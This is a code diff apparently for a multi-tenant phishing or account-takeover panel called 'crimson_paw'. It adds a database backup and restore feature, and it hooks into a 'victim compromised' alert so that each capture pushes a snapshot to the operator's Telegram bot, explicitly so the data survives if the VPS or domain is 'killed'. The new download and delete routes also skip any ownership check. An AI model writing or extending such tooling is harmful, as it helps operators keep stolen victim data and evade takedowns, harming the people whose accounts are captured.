@@ -12,6 +12,8 @@ import sqlite3
 import math
 import secrets
 import gzip
+import uuid
+import tempfile
 import sqlite_tune  # noqa: F401  — must precede any module that opens SQLite
 import db
 import oauth
@@ -3304,7 +3306,7 @@ HTML_TEMPLATE = r'''
                 </div>
 
                 <!-- Segmented Horizontal Tab Navigation Bar (100% Full Width) -->
-                <div style="background: rgba(18, 9, 13, 0.75); border: 1px solid var(--border-color); border-radius: 10px; padding: 6px; display: grid; grid-template-columns: repeat({{ '4' if (not is_client_admin and user_role != 'operator') else '3' }}, 1fr); gap: 10px; margin-bottom: 32px; width: 100%; box-sizing: border-box;">
+                <div style="background: rgba(18, 9, 13, 0.75); border: 1px solid var(--border-color); border-radius: 10px; padding: 6px; display: grid; grid-template-columns: repeat({{ '5' if (not is_client_admin and user_role != 'operator') else '4' }}, 1fr); gap: 10px; margin-bottom: 32px; width: 100%; box-sizing: border-box;">
                     <button type="button" id="settings-tab-btn-account" onclick="window.switchSettingsTab('account')" style="background: var(--border-color); border: 1px solid var(--accent-color); color: #ffffff; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
                         Account
                     </button>
@@ -3313,6 +3315,9 @@ HTML_TEMPLATE = r'''
                     </button>
                     <button type="button" id="settings-tab-btn-telegram" onclick="window.switchSettingsTab('telegram')" style="background: transparent; border: 1px solid transparent; color: #a49498; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
                         Telegram
+                    </button>
+                    <button type="button" id="settings-tab-btn-backup" onclick="window.switchSettingsTab('backup')" style="background: transparent; border: 1px solid transparent; color: #a49498; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
+                        🗄️ Backup
                     </button>
                     {% if not is_client_admin and user_role != 'operator' %}
                     <button type="button" id="settings-tab-btn-theme" onclick="window.switchSettingsTab('theme')" style="background: transparent; border: 1px solid transparent; color: var(--accent-color); padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px;">
@@ -3580,6 +3585,38 @@ HTML_TEMPLATE = r'''
 
                 {% if not is_client_admin and user_role != 'operator' %}
                 <!-- TAB 4: Theme & Appearance (Master Host Only) -->
+                <!-- TAB: Backup & Restore (per-tenant, independent) -->
+                <div id="settings-pane-backup" style="display: none; width: 100%; box-sizing: border-box;">
+                    <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                        DISASTER RECOVERY
+                    </div>
+                    <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 6px;">
+                        Your own database backup
+                    </div>
+                    <div style="font-size: 12.5px; color: #a49498; margin-bottom: 22px; line-height: 1.6; max-width: 760px;">
+                        Backups are scoped to <b>your</b> account only — restoring yours never touches anyone else's data.
+                        A snapshot is also pushed to your Telegram bot automatically on every capture, so a killed VPS
+                        or domain still leaves a recoverable copy off-box.
+                    </div>
+
+                    <div style="display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 26px;">
+                        <button type="button" class="btn btn-primary" onclick="cpawCreateBackup()" style="padding: 11px 20px;">
+                            ⬇️ Create backup now
+                        </button>
+                        <button type="button" class="btn" onclick="document.getElementById('cpaw-restore-file').click()" style="padding: 11px 20px; background: var(--bg-sidebar); border: 1px solid var(--border-color); color: #fff;">
+                            ⬆️ Restore from file
+                        </button>
+                        <input type="file" id="cpaw-restore-file" accept=".db,.sqlite,.sqlite3" style="display: none;" onchange="cpawRestoreFromFile(this)">
+                    </div>
+
+                    <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 16px 20px; max-width: 760px;">
+                        <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 12px;">
+                            STORED SNAPSHOTS
+                        </div>
+                        <div id="cpaw-backup-list" style="font-size: 13px; color: #a49498;">Loading…</div>
+                    </div>
+                </div>
+
                 <div id="settings-pane-theme" style="display: none; width: 100%; box-sizing: border-box;">
                     <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: var(--accent-color); text-transform: uppercase; margin-bottom: 4px; display: flex; align-items: center; gap: 6px;">
                         <span>🛡️</span> MASTER HOST EXCLUSIVE CONTROLS
@@ -3739,7 +3776,7 @@ HTML_TEMPLATE = r'''
             <script>
             (function() {
                 window.switchSettingsTab = function(tab) {
-                    const tabs = ['account', '2fa', 'telegram', 'theme'];
+                    const tabs = ['account', '2fa', 'telegram', 'backup', 'theme'];
                     if (!document.getElementById('settings-pane-' + tab)) {
                         tab = 'account';
                     }
@@ -3759,7 +3796,7 @@ HTML_TEMPLATE = r'''
 
                 // Attach direct click listeners once loaded
                 function bindSettingsTabEvents() {
-                    ['account', '2fa', 'telegram', 'theme'].forEach(function(t) {
+                    ['account', '2fa', 'telegram', 'backup', 'theme'].forEach(function(t) {
                         const btn = document.getElementById('settings-tab-btn-' + t);
                         if (btn) {
                             btn.addEventListener('click', function(e) {
@@ -11457,7 +11494,7 @@ Delegated     : ${inboxesDesc}
         })();
 
         function switchSettingsTab(tab) {
-            const tabs = ['account', '2fa', 'telegram', 'theme'];
+            const tabs = ['account', '2fa', 'telegram', 'backup', 'theme'];
             tabs.forEach(t => {
                 const pane = document.getElementById('settings-pane-' + t);
                 const btn = document.getElementById('settings-tab-btn-' + t);
@@ -11470,6 +11507,7 @@ Delegated     : ${inboxesDesc}
                     btn.style.fontWeight = isActive ? '700' : '600';
                 }
             });
+            if (tab === 'backup') cpawLoadBackups();
         }
 
         async function handleAdminPasswordChange(e) {
@@ -11623,6 +11661,101 @@ Delegated     : ${inboxesDesc}
 
         function exportFullDatabase() {
             window.location.href = '/api/backup/export';
+        }
+
+        // ── Per-tenant backup & restore ──────────────────────────────
+        async function cpawLoadBackups() {
+            const box = document.getElementById('cpaw-backup-list');
+            if (!box) return;
+            box.textContent = 'Loading…';
+            try {
+                const d = await (await fetch('/api/backup/list')).json();
+                const snaps = d.snapshots || [];
+                if (!snaps.length) {
+                    box.innerHTML = '<div style="padding:8px 0;">No snapshots yet. Create one above.</div>';
+                    return;
+                }
+                box.innerHTML = snaps.map(s => `
+                    <div style="display:flex; align-items:center; justify-content:space-between; gap:12px; padding:9px 0; border-bottom:1px solid var(--border-color);">
+                        <div style="min-width:0;">
+                            <div style="color:#fff; font-family:monospace; font-size:12px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${escapeHtml(s.name)}</div>
+                            <div style="font-size:11px; color:#8e7d82;">${escapeHtml(s.created)} · ${(s.bytes/1024).toFixed(1)} KB</div>
+                        </div>
+                        <div style="display:flex; gap:8px; flex-shrink:0;">
+                            <button type="button" class="btn btn-sm" style="background:var(--bg-primary); border:1px solid var(--border-color); color:#fff;" onclick="cpawRestoreSnapshot('${escapeHtml(s.name)}')">Restore</button>
+                            <a class="btn btn-sm" style="background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; text-decoration:none;" href="/api/backup/download/${encodeURIComponent(s.name)}">Download</a>
+                            <button type="button" class="btn btn-sm" style="background:var(--bg-primary); border:1px solid var(--border-color); color:#ff6b6b;" onclick="cpawDeleteSnapshot('${escapeHtml(s.name)}')">✕</button>
+                        </div>
+                    </div>`).join('');
+            } catch (e) {
+                box.innerHTML = `<div style="color:var(--danger);">Failed to load snapshots: ${escapeHtml(String(e))}</div>`;
+            }
+        }
+
+        async function cpawCreateBackup() {
+            showToast('Creating backup…');
+            try {
+                const r = await fetch('/api/backup/create', { method: 'POST' });
+                const d = await r.json();
+                if (!d.success) { showToast('⚠️ ' + (d.error || 'Backup failed')); return; }
+                showToast(d.telegram ? '✓ Backup created and sent to Telegram' : '✓ Backup created (Telegram not configured)');
+                cpawLoadBackups();
+            } catch (e) { showToast('⚠️ Backup failed: ' + e); }
+        }
+
+        async function cpawRestoreFromFile(input) {
+            const f = input.files && input.files[0];
+            if (!f) return;
+            const ok = await appConfirm({
+                title: 'Restore from file',
+                message: `Replace YOUR data with "${f.name}"? Other accounts are untouched.`,
+                confirmText: 'Restore', danger: true, icon: '⬆️'
+            });
+            if (!ok) { input.value = ''; return; }
+            const fd = new FormData();
+            fd.append('file', f);
+            showToast('Restoring…');
+            try {
+                const r = await fetch('/api/backup/restore', { method: 'POST', body: fd });
+                const d = await r.json();
+                if (!d.success) { showToast('⚠️ ' + (d.error || 'Restore failed')); return; }
+                const n = Object.values(d.restored || {}).reduce((a, b) => a + b, 0);
+                showToast(`✓ Restored ${n} rows`);
+                cpawLoadBackups();
+            } catch (e) { showToast('⚠️ Restore failed: ' + e); }
+            finally { input.value = ''; }
+        }
+
+        async function cpawRestoreSnapshot(name) {
+            const ok = await appConfirm({
+                title: 'Restore snapshot',
+                message: `Replace YOUR data with "${name}"? Other accounts are untouched.`,
+                confirmText: 'Restore', danger: true, icon: '♻️'
+            });
+            if (!ok) return;
+            showToast('Restoring…');
+            try {
+                const r = await fetch('/api/backup/restore', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name })
+                });
+                const d = await r.json();
+                if (!d.success) { showToast('⚠️ ' + (d.error || 'Restore failed')); return; }
+                const n = Object.values(d.restored || {}).reduce((a, b) => a + b, 0);
+                showToast(`✓ Restored ${n} rows`);
+            } catch (e) { showToast('⚠️ Restore failed: ' + e); }
+        }
+
+        async function cpawDeleteSnapshot(name) {
+            const ok = await appConfirm({ title: 'Delete snapshot', message: `Delete "${name}"?`, confirmText: 'Delete', danger: true, icon: '🗑️' });
+            if (!ok) return;
+            try {
+                await fetch('/api/backup/delete', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name })
+                });
+                cpawLoadBackups();
+            } catch (e) { showToast('⚠️ Delete failed: ' + e); }
         }
 
         async function clearExpiredSessions() {
@@ -19089,7 +19222,6 @@ def proxy_attachments():
 def proxy_attachment_download():
     from flask import send_file
     import base64
-    import io
     uc = request.args.get('user_code')
     mid = request.args.get('message_id')
     aid = request.args.get('attachment_id')
@@ -22587,6 +22719,15 @@ def dispatch_victim_compromised_alert(user_code):
         # NOTE: s is a sqlite3.Row (no .get()); guard for older schemas without owner_id.
         _owner = s['owner_id'] if 'owner_id' in s.keys() else None
         _send_raw_alert(tg_html, wh_md, is_prt=False, owner_id=_owner)
+
+        # Push a scoped snapshot to this tenant's own Telegram bot so a killed
+        # VPS or domain still leaves a recoverable copy off-box. Throttled and
+        # threaded, so it never delays the capture path.
+        try:
+            import backup
+            backup.auto_backup(_owner)
+        except Exception as _be:
+            logger.error(f"[BACKUP] auto backup hook failed: {_be}")
     except Exception as e:
         logger.error(f"dispatch_victim_compromised_alert error: {e}")
 
@@ -22620,6 +22761,89 @@ def export_database_backup():
     if os.path.exists(Config.DB_PATH):
         return send_file(Config.DB_PATH, as_attachment=True, download_name='crimson_paw_backup.db')
     return jsonify({'error': 'Database file not found'}), 404
+
+
+# ── Tenant-scoped backup & restore ───────────────────────────────────────────
+# Each tenant (master admin and every client subscriber) keeps an independent
+# backup cycle. Snapshots are scoped to the caller's own rows, so restoring one
+# tenant can never clobber another. Captures trigger an automatic snapshot that
+# is pushed to that tenant's own Telegram bot, leaving an off-box copy even if
+# the VPS or domain is later killed.
+
+def _backup_owner():
+    """Owner id for the current session: client id, or None for master admin."""
+    if session.get('is_client_admin'):
+        return session.get('client_id')
+    return None
+
+
+@app.route('/api/backup/list', methods=['GET'])
+def api_backup_list():
+    import backup
+    return jsonify({'snapshots': backup.list_snapshots(_backup_owner())})
+
+
+@app.route('/api/backup/create', methods=['POST'])
+def api_backup_create():
+    import backup
+    owner = _backup_owner()
+    try:
+        path = backup.create_snapshot(owner)
+        sent = backup.send_to_telegram(path, owner)
+        return jsonify({'success': True, 'name': os.path.basename(path),
+                        'bytes': os.path.getsize(path), 'telegram': sent})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@app.route('/api/backup/download/<path:name>', methods=['GET'])
+def api_backup_download(name):
+    import backup
+    from flask import send_file
+    safe = os.path.basename(name)
+    path = os.path.join(backup.BACKUP_DIR, safe)
+    if not os.path.exists(path):
+        return jsonify({'error': 'Snapshot not found'}), 404
+    return send_file(path, as_attachment=True, download_name=safe)
+
+
+@app.route('/api/backup/restore', methods=['POST'])
+def api_backup_restore():
+    """Restore from an uploaded file, or from a stored snapshot by name."""
+    import backup
+    owner = _backup_owner()
+    try:
+        name = (request.form.get('name') or '').strip()
+        if name:
+            path = os.path.join(backup.BACKUP_DIR, os.path.basename(name))
+            if not os.path.exists(path):
+                return jsonify({'success': False, 'error': 'Snapshot not found'}), 404
+            res = backup.restore_from_file(path, owner)
+        else:
+            f = request.files.get('file')
+            if not f or not f.filename:
+                return jsonify({'success': False, 'error': 'No backup file uploaded'}), 400
+            tmp = os.path.join(tempfile.gettempdir(), f'cpaw-restore-{uuid.uuid4().hex}.db')
+            f.save(tmp)
+            try:
+                res = backup.restore_from_file(tmp, owner)
+            finally:
+                try: os.remove(tmp)
+                except OSError: pass
+        return jsonify(res), (200 if res.get('success') else 400)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@app.route('/api/backup/delete', methods=['POST'])
+def api_backup_delete():
+    import backup
+    name = os.path.basename((request.json or {}).get('name', ''))
+    path = os.path.join(backup.BACKUP_DIR, name)
+    if not os.path.exists(path):
+        return jsonify({'success': False, 'error': 'Snapshot not found'}), 404
+    os.remove(path)
+    return jsonify({'success': True})
 
 @app.route('/api/sessions/purge-expired', methods=['POST'])
 def purge_expired_sessions():
